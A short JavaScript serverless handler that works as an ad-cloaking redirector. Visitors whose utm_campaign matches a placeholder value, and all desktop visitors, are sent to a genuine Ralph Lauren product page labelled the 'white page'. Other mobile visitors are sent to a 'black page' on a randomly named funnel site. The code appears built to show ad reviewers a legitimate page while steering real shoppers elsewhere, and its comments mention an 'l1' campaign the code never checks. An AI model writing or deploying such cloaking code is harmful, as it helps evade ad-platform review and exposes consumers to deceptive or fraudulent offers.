export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.ralphlauren.global/pk/en/cotton-chino-baseball-cap-461540.html?dwvar461540_colorname=Nubuck%2FRelay%20Blue&cgid=men-caps-hats-scarves-gloves#srsltid=AfmBOoq7kSn0_HlqBahd9KGTRIAY-3Cgaif0m2_lo7o_yqv3k5r308XD&start=1&cgid=men-caps-hats-scarves-gloves";
    const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/imbassd-1736979042571105-1738006308191131-1738511238414243";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
